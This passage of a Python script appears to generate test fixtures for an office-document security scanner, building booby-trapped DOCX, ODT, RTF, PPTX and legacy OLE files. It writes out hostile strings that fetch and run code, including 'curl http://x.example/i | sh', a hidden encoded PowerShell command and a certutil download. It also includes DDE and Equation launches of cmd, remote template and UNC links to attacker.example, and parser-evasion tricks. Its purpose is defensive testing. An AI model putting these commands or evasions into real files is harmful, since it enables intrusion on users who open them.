    write(R / "office_truncated.docx", docx()[:150])
    write(R / "office_not_ooxml.docx", zbytes([("readme.txt", b"just a zip renamed .docx\n")]))
    write(R / "office_encrypted.docx", cfb({"EncryptionInfo": b"\x04\x00\x04\x00" + b"\x00" * 60, "EncryptedPackage": b"\x00" * 5000,
                                            "\x06DataSpaces": {"Version": b"\x00" * 8}}))

    # ── OpenDocument ────────────────────────────────────────────────────────
    write(R / "office_odf_macro.odt", odf(
        scripts='<office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" '
                'script:event-name="office:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/>'
                "</office:event-listeners></office:scripts>",
        extra=basic_module("Module1", 'Sub Main\n  Shell("cmd /c calc.exe")\nEnd Sub\n')))
    write(R / "office_odf_macro_benign.ods", odf(
        mime="application/vnd.oasis.opendocument.spreadsheet",
        extra=basic_module("Module1", 'Sub Main\n  MsgBox "Hello"\nEnd Sub\n')))
    write(R / "office_odf_python.odt", odf(extra={
        "Scripts/python/report.py": b"import os\ndef run():\n    os.system('curl http://x.example/i | sh')\n"}))
    write(R / "office_odf_dde.ods", odf(
        mime="application/vnd.oasis.opendocument.spreadsheet",
        body='<table:table table:name="T"><table:table-row><table:table-cell><text:p>x</text:p></table:table-cell></table:table-row>'
             '<table:table-row><table:table-cell table:formula="of:=DDE(&quot;cmd&quot;;&quot;/c calc&quot;;&quot;x&quot;)"/></table:table-row></table:table>'
             '<table:dde-links><table:dde-link><office:dde-source office:dde-application="cmd" office:dde-topic="/c calc.exe" office:dde-item="x"/>'
             "</table:dde-link></table:dde-links>"))
    write(R / "office_odf_unc.odt", odf('<text:p><draw:frame><draw:image xlink:href="\\\\attacker.example\\share\\logo.png"/></draw:frame></text:p>'))
    write(R / "office_odf_remote.odt", odf('<text:p><draw:frame><draw:image xlink:href="http://tracker.example/pixel.gif"/></draw:frame></text:p>'))
    write(R / "office_odf_encrypted.odt", odf(manifest_extra='<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml">'
                                                '<manifest:encryption-data manifest:checksum-type="SHA1/1K"/></manifest:file-entry>'))
    write(R / "office_odf_flat_dde.fods", (CT_HEAD + f'<office:document {ODF_NS} office:mimetype="application/vnd.oasis.opendocument.spreadsheet">'
                                           '<office:body><office:spreadsheet><table:dde-links><table:dde-link>'
                                           '<office:dde-source office:dde-application="powershell" office:dde-topic="-enc AAAA" office:dde-item="x"/>'
                                           "</table:dde-link></table:dde-links></office:spreadsheet></office:body></office:document>").encode())

    # ── RTF ─────────────────────────────────────────────────────────────────
    write(R / "office_rtf_equation.rtf", rtf(rtf_object("Equation.3", b"cmd /c calc.exe " + b"A" * 60)))
    write(R / "office_rtf_autolink.rtf", rtf(rtf_object("htmlfile", b"http://attacker.example/x.hta", "\\objautlink\\objupdate")))
    write(R / "office_rtf_template.rtf", rtf("{\\*\\template http://attacker.example/evil.dotm}\\pard Hello\\par"))
    write(R / "office_rtf_package.rtf", rtf(rtf_object("Package", ole10native("invoice.exe", pe()))))
    write(R / "office_rtf_dde.rtf", rtf('{\\field{\\*\\fldinst DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"}{\\fldrslt x}}'))
    write(R / "office_rtf_object.rtf", rtf(rtf_object("Word.Document.8", cfb({"WordDocument": b"\x00" * 64}))))
    # The same Equation object with junk the RTF reader ignores: line breaks and empty groups inside the hex,
    # and the control word split from its argument by a group.
    h = ole1_object("Equation.3", b"cmd /c calc.exe " + b"A" * 60).hex()
    chunks = [h[i:i + 20] for i in range(0, len(h), 20)]
    obf = "{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata " + "{}\r\n".join(chunks) + "}}"
    write(R / "office_rtf_obfuscated.rtf", rtf(obf))

    # ── found by looking for ways round the rules ───────────────────────────
    # '>' is legal inside a quoted attribute value, and so is a single quote: a reader that cuts the
    # tag at the first '>' (or expects double quotes) never sees the Type and Target that follow.
    gt = (CT_HEAD + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
          f'<Relationship Id="a>b" Type="{REL}/oleObject" Target="http://attacker.example/x.html!" TargetMode="External"/>'
          f"<Relationship Id='c' Type='{REL}/attachedTemplate' Target='http://attacker.example/t.dotm' TargetMode='External'/>"
          "</Relationships>").encode()
    write(R / "office_gt_attr.docx", docx(extra={"word/_rels/document.xml.rels": gt}))
    # A ":LOW:" in a target must not turn the FAIL into a warning (record_fail reads severity from the message).
    write(R / "office_severity_marker.docx", docx(doc_rels=[("rId9", "image", "\\\\attacker:LOW:\\share\\x.png", True)]))
    write(R / "office_hidden_exe.docx", docx(extra={"word/media/image1.png": pe()}))
    body = base64.b64encode(bytes((i * 7 + 3) % 256 for i in range(144))).decode()
    pem = ("-----BEGIN RSA PRIVATE KEY-----\n" + "\n".join(body[i:i + 64] for i in range(0, len(body), 64))
           + "\n-----END RSA PRIVATE KEY-----")
    write(R / "office_pem.docx", docx("".join(f"<w:p><w:r><w:t>{ln}</w:t></w:r></w:p>" for ln in pem.split("\n"))))
    # The Excel 4.0 macro sheet that is visible and calls nothing dangerous: reported, not blocked.
    write(R / "office_xlm_visible.xlsm", xlsx(
        sheets='<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" r:id="rId2"/>',
        wb_rels=[("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "macrosheets/sheet1.xml", False)],
        extra={"xl/macrosheets/sheet1.xml": (CT_HEAD + '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                                             '<sheetData><row r="1"><c r="A1"><f>HALT()</f></c></row></sheetData></worksheet>').encode()},
        content_extra='<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    # A VBA storage whose streams hold nothing readable: a macro exists, its source cannot be seen.
    write(R / "office_vba_garbage.docm", docx(
        extra={"word/vbaProject.bin": cfb({"VBA": {"dir": b"\x00" * 40, "_VBA_PROJECT": b"\xcc\x61\xff\xff\x00\x00\x00", "Module1": b"\x01\x02\x03" * 20}})},
        content_extra=vba_ct))
    # Three documents deep is read; four is not.
    lvl = docx(doc_rels=[("rId9", "oleObject", "embeddings/o.bin", False)], extra={"word/embeddings/o.bin": cfb({"VBA": {"dir": b"\x00" * 40}})}) if False else None
    deep = docx(extra={"word/vbaProject.bin": cfb(vba_project({"ThisDocument": VBA_EVIL_DOC}))}, content_extra=vba_ct)
    for _ in range(4):
        deep = docx(doc_rels=[("rId9", "package", "embeddings/inner.docx", False)], extra={"word/embeddings/inner.docx": deep})
    write(R / "office_nested_deep.docx", deep)
    # A part stored with a compression method nobody here can read.
    un = bytearray(docx(doc_rels=[("rId9", "oleObject", "embeddings/o.bin", False)], extra={"word/embeddings/o.bin": b"some bytes " * 30}))
    i = un.find(b"PK\x03\x04")
    while i != -1:
        nl = struct.unpack_from("<H", un, i + 26)[0]
        if bytes(un[i + 30:i + 30 + nl]) == b"word/embeddings/o.bin":
            struct.pack_into("<H", un, i + 8, 99)
        i = un.find(b"PK\x03\x04", i + 4)
    i = un.find(b"PK\x01\x02")
    while i != -1:
        nl = struct.unpack_from("<H", un, i + 28)[0]
        if bytes(un[i + 46:i + 46 + nl]) == b"word/embeddings/o.bin":
            struct.pack_into("<H", un, i + 10, 99)
        i = un.find(b"PK\x01\x02", i + 4)
    write(R / "office_unreadable.docx", bytes(un))
    # ODF: a hyperlink that runs a document macro on click (not on open), and a DDE link to an ordinary program.
    write(R / "office_odf_link_macro.odt", odf(
        '<text:p><text:a xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document">run</text:a></text:p>'))
    write(R / "office_odf_dde_benign.ods", odf(
        mime="application/vnd.oasis.opendocument.spreadsheet",
        body='<table:dde-links><table:dde-link><office:dde-source office:dde-application="soffice" office:dde-topic="x" office:dde-item="y"/>'
             "</table:dde-link></table:dde-links>"))

    # The dir stream is unreadable but the module streams are fine: the source is found by its signature.
    proj = vba_project({"ThisDocument": VBA_EVIL_DOC})
    proj["VBA"]["dir"] = b"\x00" * 40
    write(R / "office_vba_corrupt_dir.docm", docx(extra={"word/vbaProject.bin": cfb(proj)}, content_extra=vba_ct))
    # A hidden Excel 4.0 macro sheet that calls nothing: hiding it is the finding.
    write(R / "office_xlm_hidden_quiet.xlsm", xlsx(
        sheets='<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" state="hidden" r:id="rId2"/>',
        wb_rels=[("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "macrosheets/sheet1.xml", False)],
        extra={"xl/macrosheets/sheet1.xml": (CT_HEAD + '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                                             '<sheetData><row r="1"><c r="A1"><f>HALT()</f></c></row></sheetData></worksheet>').encode()},
        content_extra='<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    # Hostile strings in embedded scripts: an encoded PowerShell command, a certutil download.
    enc = base64.b64encode("Write-Host 'aitransit fixture payload'".encode("utf-16-le")).decode()
    write(R / "office_odf_hostile.odt", odf(extra={
        "Scripts/python/a.py": ("import os\ndef a():\n    os.system('powershell -nop -w hidden -enc " + enc + "')\n").encode(),
        "Scripts/python/b.py": b"def b():\n    cmd = 'certutil -urlcache -split -f http://x.example/a.exe a.exe'\n"}))
    # meta:template names the template a document was made from: every document made from a template has it.
    write(R / "office_safe_template_link.odt", odf(extra={"meta.xml": (
        CT_HEAD + '<office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
        'xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:xlink="http://www.w3.org/1999/xlink"><office:meta>'
        '<meta:template xlink:type="simple" xlink:actuate="onRequest" xlink:title="Letter" '
        'xlink:href="file:///usr/share/templates/Letter.ott"/></office:meta></office:document-meta>').encode()}))

    # ── a second look: presentation actions, fetch fields, share schemes ────
    slide_ns = ('xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
                'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" ' + NS_R)

    def action_slide(action: str) -> dict:
        return {"ppt/slides/slide1.xml": (CT_HEAD + f'<p:sld {slide_ns}><p:cSld><p:spTree><p:sp><p:txBody><a:p><a:r>'
                                          f'<a:rPr><a:hlinkClick r:id="rId2" action="{action}"/></a:rPr><a:t>Click</a:t></a:r></a:p>'
                                          "</p:txBody></p:sp></p:spTree></p:cSld></p:sld>").encode(),
                "ppt/slides/_rels/slide1.xml.rels": rels([
                    ("rId2", "hyperlink", "file:///C:\\Windows\\System32\\cmd.exe", True)])}

    write(R / "office_pptx_program.pptx", pptx(extra=action_slide("ppaction://program")))
    write(R / "office_pptx_macro_action.pptx", pptx(extra=action_slide("ppaction://macro?name=Module1.Run")))
    fields = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDEPICTURE '
              '"\\\\attacker.example\\share\\logo.png" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
              '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INCLUDETEXT "http://remote.example/boiler.docx" </w:instrText></w:r>'
              '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    write(R / "office_field_include.docx", docx(fields))
    write(R / "office_smb.docx", docx(doc_rels=[("rId9", "image", "smb://attacker.example/share/logo.png", True)]))
    # Legacy PowerPoint keeps its VBA project in a zlib-compressed ExOleObjStg record, not in a CFB stream.
    raw = cfb(vba_project({"Module1": VBA_EVIL_DOC.replace("ThisDocument", "Module1")}))
    zc = zlib.compress(raw)
    ex = struct.pack("<HHI", 0x10, 0x1011, 4 + len(zc)) + struct.pack("<I", len(raw)) + zc
    write(R / "office_legacy_ppt_macro.ppt", cfb({"PowerPoint Document": struct.pack("<HHI", 0x000F, 0x03E8, len(ex)) + ex}))

    # An embedded workbook (a chart's data) is ordinary: found while measuring real documents, where every
    # chart in a .docx / .pptx came with one and each used to draw an "embedded object" warning.
    write(R / "office_embedded_workbook.docx", docx(
        doc_rels=[("rId9", "package", "embeddings/Microsoft_Excel_Sheet1.xlsx", False)],
        extra={"word/embeddings/Microsoft_Excel_Sheet1.xlsx": xlsx()}))
    write(R / "office_legacy_objpool_workbook.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_4": {"Workbook": b"\x09\x08\x10\x00" + b"\x00" * 16 + b"\x0a\x00\x00\x00", "\x01CompObj": b"Microsoft Excel Worksheet\x00"}}}))
    # An embedded ZIP that is not an office document is opaque: reported, and it must not make the
    # DOCUMENT look "not an office document".
    write(R / "office_embedded_zip.docx", docx(
        doc_rels=[("rId9", "package", "embeddings/data.zip", False)],
        extra={"word/embeddings/data.zip": zbytes([("readme.txt", b"just a zip\n")])}))
    # An OOXML package wrapped in an OLE object (a stream called Package): opened, and its macro found.
    inner_x = xlsx(extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": VBA_EVIL_XLS}))},
                   content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>')
    write(R / "office_legacy_package_stream.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_5": {"Package": inner_x, "\x01CompObj": b"Package\x00"}}}))

    # ── legacy binary (OLE2) ────────────────────────────────────────────────
    write(R / "office_legacy_macro.doc", cfb({
        "WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60, "1Table": b"\x00" * 64,
        "Macros": vba_project({"ThisDocument": VBA_EVIL_DOC})}))
    write(R / "office_legacy_macro_benign.xls", cfb({
        "Workbook": b"\x09\x08\x10\x00" + b"\x00" * 16 + b"\x0a\x00\x00\x00",
        "_VBA_PROJECT_CUR": vba_project({"ThisWorkbook": VBA_BENIGN})}))
    write(R / "office_legacy_equation.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_1": {"Equation Native": b"\x1c\x00\x00\x00\x02\x00" + b"cmd /c calc.exe " + b"A" * 80, "\x01CompObj": b"Microsoft Equation 3.0\x00"}}},
        clsids={("ObjectPool", "_1"): EQUATION_CLSID}))
    write(R / "office_legacy_equation_benign.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_1": {"Equation Native": b"\x1c\x00\x00\x00\x02\x00\x01\x02\x03\x04" + b"\x00" * 40, "\x01CompObj": b"Microsoft Equation 3.0\x00"}}},
        clsids={("ObjectPool", "_1"): EQUATION_CLSID}))
    write(R / "office_legacy_package.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_2": {"\x01Ole10Native": ole10native("invoice.exe", pe()), "\x01CompObj": b"Package\x00"}}}))
    write(R / "office_legacy_objpool.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60, "ObjectPool": {"_3": {"CONTENTS": b"chart data " * 40}}}))
    # A Workbook stream of BIFF8 records: BOF, BOUNDSHEET8 (one worksheet, one hidden macro sheet), EOF.
    def bof():
        return struct.pack("<HHHHHHII", 0x0809, 16, 0x600, 0x5, 0x1CE8, 0x07CC, 0, 6)

    def boundsheet(name, hidden, kind):
        nm = name.encode("latin-1")
        return struct.pack("<HHIBB", 0x0085, 8 + len(nm), 0, hidden, kind) + struct.pack("<BB", len(nm), 0) + nm

    book = bof() + boundsheet("Sheet1", 0, 0) + boundsheet("Macro1", 2, 1) + struct.pack("<HH", 0x000A, 0)
    write(R / "office_legacy_xlm.xls", cfb({"Workbook": book}))
    write(R / "office_legacy_dde.doc", cfb({
        "WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60 + b"DDEAUTO c:\\windows\\system32\\cmd.exe /k calc.exe\x00", "1Table": b"\x00" * 64}))
    write(R / "office_legacy_truncated.doc", cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 6000})[:700])


if __name__ == "__main__":
    main()
